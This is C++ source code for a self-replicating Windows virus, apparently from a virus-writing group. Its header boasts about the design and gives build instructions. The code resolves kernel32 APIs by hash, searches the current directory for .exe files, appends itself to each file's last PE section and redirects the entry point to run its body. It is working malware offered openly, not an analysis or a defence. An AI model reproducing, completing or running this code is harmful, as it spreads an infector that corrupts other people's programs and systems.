
/*

		  Welcome to the GAYBAR§§§ (from ikx industries)
		-================================================-

 Technically, this virus has nothing new. It's a very old school virus that appends 
 its code to the last section and modifies the entry point in the PE header. It 
 browses the import table in order to find the kernel address and imports APIs by CRC. 
 The virus is about 1200 bytes long. It's a bit big for a virus of this kind and it 
 requires some optimization. The main idea is that it was written in 100% c++ to take 
 advantage of the use of classes. No assembly file or special linking is needed. It 
 does everything just as a standard assembly virus would do.  It has no need for 
 relocation; it can use global pointers and ignores the delta pointer problem. It was 
 compiled using Visual Studio Architect. Just remove the "Buffer Security Check" and 
 put it in release mode. (Don’t forget to put size optimization). It also seems to work 
 with Visual Studio 6.0.

 But, all is not pink in this happy world. There are a few problems. You can't use any 
 strings inside the executable. I reconstructed the strings by dropping values into 
 buffers as a meta virus would do. (int k[0] = 'xe.*') We are seeking how to solve 
 this problem in a better way. Also, it's not really 100% c++ as it still has a stub 
 loader that will call the virus body. This part is in assembly and consists of a few 
 pushes and a call. This virus might be "portable" to other platforms as long as you 
 remedy the stub problem. 

 The point of this virus is to pimp people to the c++ side.  A virus can be done within 
 a reasonable size using c++, doing almost as well as an assembly virus. I hope this 
 creates a new era with future babies coming along.

 Greets to: 

 Vorgon:   You are god, i bow down before you oh master dark lord of VX. My Hero!
 Lifewire: to have pimped me to the c++ side, for the original idea as well as the
	     the motivation
 UnderX:   to be the 1st to listen to my bragging description
 Griyo:    who was the second
 Cecile:   Damn, I like you, wanted to dedicate this virus to you but I preferred the
	     GAYBAR!  jtm
 Morphine: for correcting my english! 10x0r!

 Welcome to the GAYBAR !!

*/

#include "stdio.h"
#include "windows.h"
#include "PE.hpp"

typedef void* __stdcall iGetModuleHandle(char*);
typedef void* __stdcall iLoadLibraryA(char*);
typedef HANDLE __stdcall iFindFirstFileA(void*,LPWIN32_FIND_DATA);
typedef bool __stdcall iFindNextFileA(HANDLE,LPWIN32_FIND_DATA);
typedef void __stdcall iOutputDebugStringA(char*);
typedef HANDLE __stdcall iCreateFileA(char*,DWORD,DWORD,DWORD,DWORD,DWORD,HANDLE);
typedef HANDLE __stdcall iCreateFileMappingA(HANDLE,DWORD,DWORD,DWORD,DWORD,char*);
typedef void* __stdcall iMapViewOfFile(HANDLE,DWORD,DWORD,DWORD,DWORD);
typedef void __stdcall iUnmapViewOfFile(void*);
typedef void __stdcall iCloseHandle(HANDLE);
typedef DWORD __stdcall iGetFileSize(HANDLE, int);

#define LoadLibraryACrc 0x660E91B6
#define FindFirstFileACrc 0xFACA6F2D
#define FindNextFileACrc 0x47F9DA21
#define OutputDebugStringACrc 0xFBDF28B7
#define CreateFileACrc 0x8DC85CF9
#define CreateFileMappingACrc 0xA3A46E23
#define MapViewOfFileCrc 0x505C8F3F
#define UnmapViewOfFileCrc 0x5239B6AF
#define CloseHandleCrc 0x4E1ED759
#define GetFileSizeCrc 0xC37E2502

#define vir_size (((int) main - 0x00401000))

void __stdcall start(void *ImageBase, void *viruslocation);
int main(int argc, char **argv);


int iround(int a, int b) { return ((a / b)+1)* b; }

// Dumb crc routine, it isn't really crc, less powerful but it's sufficient for 
// apiname checking.

DWORD GetAPICrc(char *name)
{
	DWORD k = 0;

	for(int i = 0; name[i] != 0; i++)
		k = (k << 3) + (k >> (sizeof(k) -3)) + name[i];

	return k;
}

class virus
{
	public:
		
		//
		//	Api finder, you specify the Address base of the PE and the crc
		//  of the address and it will return the address to you.  If it fails, it
		//	returns 0 and sets a global flag called missed
		//

		void *GetProcAddressCrc(char *ModuleBase, DWORD APICrc)
		{
			PE_STRUCT *PEheaderBase = (PE_STRUCT *) (ModuleBase + ((DWORD *) (ModuleBase+0x3C))[0]);
			PE_EXPORT_STRUCT *ExportTable = (PE_EXPORT_STRUCT *) ( ModuleBase + PEheaderBase->pe_exportrva);

			if(PEheaderBase->pe_exportrva != 0)
			{
				// Here you get all the pointers, so once it's found, you only have to
				// grab the data from the table once

				DWORD* NameTable = (DWORD *) (ModuleBase + ExportTable->ex_namepointersrva);
				WORD* Ordinaltable = (WORD *) (ModuleBase + ExportTable->ex_ordinaltablerva);
				DWORD* AddressTable = (DWORD *) (ModuleBase + ExportTable->ex_addresstablerva);

				for(int i = 0; i < ExportTable->ex_numofnamepointers; i++)
				{
					if(GetAPICrc((char *) ModuleBase+NameTable[i]) == APICrc)
						return ModuleBase+AddressTable[Ordinaltable[i]];
				}
			}

			missed = true;
			return 0;
		}

		// Linked chain

		struct NameList
		{
			NameList *Previous;
			void *location;
		};

		//
		// Find the Kernel32 address by browsing the Import Table.  It searches for
		// "KERNEL32".  If the library isn't KERNEL32, it browses the import
		// table of the library.  This is done by using a recursive function.  It
		// scans the import table and imports the table of imported libraries, and
		// etc.  But, It could cycle :(  What if user32.dll points to advapi.dll
		// and advapi.dll points to user32.dll?  It would cycle infinitly.
		//
		// I stored a list of already scanned libraries (NameList).  Before scanning
		// sub libraries, it checks if the libary hasn't been scanned yet.
		//

		void *GetK32Address(char *PEImageBase, NameList *List = 0)
		{
				PE_STRUCT *PEheaderBase = (PE_STRUCT *) (PEImageBase + ((DWORD *) (PEImageBase+0x3C))[0]);
				PE_IMPORT_STRUCT *ImportTable = (PE_IMPORT_STRUCT *) (PEImageBase + PEheaderBase->pe_importrva);

				if(PEheaderBase->pe_importrva != 0)
				{
					char* LibName;				// we will scan every name

					while(PEImageBase + ImportTable->im_name)	
					{
						LibName = PEImageBase + ImportTable->im_name;

						// gets the base address of the library
						WORD **apitable = (WORD **) ((char*) PEImageBase + ImportTable->im_addresstable);
						WORD *location =  (WORD *) ((char *) apitable[0] - ((WORD *) apitable)[0]);
						while( location[0] != 'ZM') location = (WORD *) ((char*) location - 0x1000);

						// it isn't the kernel ?
						if(! ((((DWORD *) LibName)[0] == 'NREK') && (((DWORD *) LibName)[1] == '23LE')))
						{
							bool dosearch = true;
							NameList *item = List;

							while(item != 0 && dosearch) // have we searched
							{							// this library ?
								if(location == item->location) dosearch = false;
								item = item->Previous;
							}

							if(dosearch)		// if not, it adds the name to the list
							{					// and scans this library
								NameList newitem = { List, location };
								void *retaddr = GetK32Address((char *)location, &newitem);
                                if(retaddr != 0) return retaddr;
							}
						}
						else return location;

						ImportTable = (PE_IMPORT_STRUCT *) ((char *) ImportTable + sizeof(PE_IMPORT_STRUCT));
					} 
				}

				return 0;
		}

		//
		// Searches all the needed api, starting by retrieving kernel32 address 
		// from current process import table, if it's found, import all apis. If an
		// api is missed, bool missed has been set to true and it will return false
		//

		bool Import(void *PEImageBase)
		{
			char *K32Address = (char *) GetK32Address((char *) PEImageBase);
			missed = false;

			if(K32Address)
			{
				LoadLibraryA = (iLoadLibraryA *) GetProcAddressCrc( K32Address, LoadLibraryACrc);
				FindFirstFileA = (iFindFirstFileA *) GetProcAddressCrc( K32Address, FindFirstFileACrc);
				FindNextFileA = (iFindNextFileA *) GetProcAddressCrc( K32Address, FindNextFileACrc);
				OutputDebugStringA = (iOutputDebugStringA *) GetProcAddressCrc( K32Address, OutputDebugStringACrc);
				CreateFileA = (iCreateFileA *) GetProcAddressCrc( K32Address, CreateFileACrc);
				CreateFileMappingA = (iCreateFileMappingA *) GetProcAddressCrc( K32Address, CreateFileMappingACrc);
				MapViewOfFile = (iMapViewOfFile *) GetProcAddressCrc( K32Address, MapViewOfFileCrc);
				UnmapViewOfFile = (iUnmapViewOfFile *) GetProcAddressCrc( K32Address, UnmapViewOfFileCrc);
				CloseHandle = (iCloseHandle *) GetProcAddressCrc( K32Address, CloseHandleCrc);
				GetFileSize = (iGetFileSize *) GetProcAddressCrc( K32Address, GetFileSizeCrc);
			}
			
			return (K32Address && !missed);
		}

		//
		// Remap the file and in the same way resize the file
		//

		void Remap(int newsize)
		{
			UnmapViewOfFile(MapAddress);
			CloseHandle(FileMapping);
			FileMapping = CreateFileMapping(File,NULL, PAGE_READWRITE, 0, newsize, 0 );
			MapAddress = (char *) MapViewOfFile( FileMapping, FILE_MAP_ALL_ACCESS, 0, 0, newsize);
		}

		// drop a push instruction to a memory location

		void createpush(char *location, int value)
		{
				(location)[0] = (char) 0x68;
				((int *)(location+1))[0] = value;
		}

		// We got the file maped at (MapAddress), we are going to infect 
		// that file

		void ProcessInfection()
		{
			// check if exe
			if( ((WORD *) MapAddress)[0] == 'ZM' )
			{
				PE_STRUCT *PEheaderBase = (PE_STRUCT *) (MapAddress + ((DWORD *) (MapAddress+0x3C))[0]);

				// check if PE
				if( ((DWORD *) PEheaderBase)[0] == 'EP' )
				{
					// get lastsection offset
					PE_OBJENTRY_STRUCT *lastsection = (PE_OBJENTRY_STRUCT *)
						((char *) PEheaderBase + sizeof(PE_STRUCT) +
						(PEheaderBase->pe_numofobjects - 1) * sizeof(PE_OBJENTRY_STRUCT));
		
					// save information, later we will need to return to host
					// viruspos will be a working variable for now
					int old_entrypoint = PEheaderBase->pe_entrypointrva + PEheaderBase->pe_imagebase;
					int viruspos = max(lastsection->oe_physsize, lastsection->oe_virtsize);

					// change last section size in physical and memory, change
					// his permission
					lastsection->oe_physsize = iround( viruspos+vir_size, PEheaderBase->pe_filealign);
					lastsection->oe_virtsize = iround( viruspos+vir_size, PEheaderBase->pe_objectalign);
					lastsection->oe_objectflags |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
					
					// set new entry point
					PEheaderBase->pe_entrypointrva = viruspos + lastsection->oe_virtrva; 
					int new_entrypoint = PEheaderBase->pe_entrypointrva + PEheaderBase->pe_imagebase;
					int old_imagebase = PEheaderBase->pe_imagebase;

					// viruspost is now the position where we should drop virus
					viruspos += lastsection->oe_physoffs;

					// recalculate PE size in memory
					PEheaderBase->pe_imagesize = lastsection->oe_virtrva + lastsection->oe_virtsize;
					// resize file
					Remap(iround(lastsection->oe_physoffs + lastsection->oe_physsize, 128) + 69 );
					
					char *virusdest = MapAddress + viruspos;

					// we are dropping the stub loader
					// we will push on stack old entrypoint
					// two next value will be forwarded to virus

					createpush(virusdest, old_entrypoint); 
					createpush(virusdest+5, new_entrypoint+21);
					createpush(virusdest+10, old_imagebase);

					// drop call to virus
					(virusdest+15)[0] = (char) 0xE8;
					((int *)(virusdest+16))[0] = ((int) start - 0x00401000)+1;
					
					// then ret, who will jump to host
					(virusdest+20)[0] = (char) 0xC3;

					virusdest += 21;

					// drop virus here (memcpy didnt worked :()
					for(int i = 0; i < vir_size; i++)
						(virusdest++)[0] = ((char *) VirCode)[i];
					
					// drop virus copyright :)
					((__int64*) virusdest)[0] = 0x20656D6F636C6557;
					((__int64*) virusdest)[1] = 0x4720656874206F74;
					((__int64*) virusdest)[2] = 0x2020215241425941;
					((__int64*) virusdest)[3] = 0x334B325D584B495B;
				}
			}
		}

		// This function basically opens a file specified in input 
		// then maps it.  If mapping succeed and finally it ask to 
		// ProcessInfection()

		void infect(char *filename)
		{
			File = CreateFileA(filename, GENERIC_READ | GENERIC_WRITE,
						FILE_SHARE_READ,0,OPEN_EXISTING,0,0);

			if( File != INVALID_HANDLE_VALUE )
			{
				int FileSize = GetFileSize(File,0);
				FileMapping = CreateFileMapping(File,NULL,PAGE_READWRITE, 
					0, FileSize, 0 );

				if( FileMapping != INVALID_HANDLE_VALUE ) 
				{
					MapAddress = (char *) MapViewOfFile( FileMapping, 
						FILE_MAP_ALL_ACCESS, 0, 0, FileSize);

                    if(MapAddress != 0)
					{
						ProcessInfection();
						UnmapViewOfFile(MapAddress);
					}

					CloseHandle(FileMapping);
				}
				CloseHandle(File);
			}
		}

		// The real entry point of the virus.  Here, we manipulate everything
		// inside the object.  It just searches for various *.exe inside the
		// current directory

		void start_virus(void *PEBase, void *VirusCode)
		{
			if(Import(PEBase))
			{
				WIN32_FIND_DATA datas;
				HANDLE fileresult;
				VirCode = VirusCode;
				char trashbuffer[8];

				// search for *.exe
				((__int64 *) trashbuffer)[0] = 0x06578652E2A;
				fileresult = FindFirstFileA(trashbuffer, &datas);

				if(fileresult != INVALID_HANDLE_VALUE) do
				{
					if( (datas.nFileSizeLow % 128) != 69)
						infect(datas.cFileName);
				}
				while(FindNextFile(fileresult, &datas));
			}
		}

		/*
		 *  The Api Table
		 *
         ******************/

		iLoadLibraryA* LoadLibraryA;
		iFindFirstFileA* FindFirstFileA;
		iFindNextFileA* FindNextFileA;
		iOutputDebugStringA* OutputDebugStringA;
		iCreateFileA* CreateFileA;
		iCreateFileMappingA* CreateFileMappingA;
		iMapViewOfFile* MapViewOfFile;
		iUnmapViewOfFile* UnmapViewOfFile;
		iCloseHandle* CloseHandle;
		iGetFileSize* GetFileSize;

		// functions

		bool missed;

		HANDLE File;
		HANDLE FileMapping;
		char *MapAddress;
		void *VirCode;
};

// This creates an instance of object virus on the stack, and then calls the 
// virus.  The global variable inside the class will be taken from the stack
// and not from data

void __stdcall start(void *ImageBase, void *viruslocation) 
{
	virus A;
	A.start_virus(ImageBase, viruslocation);
}

// this will fake the stub loader and call our virus

int main(int argc, char **argv)
{
	int k = vir_size;
	start((void*) 0x00400000, (void *) 0x00401000);
	printf("welcome to the Gaybar: %i\n", k);
	return 0;
}

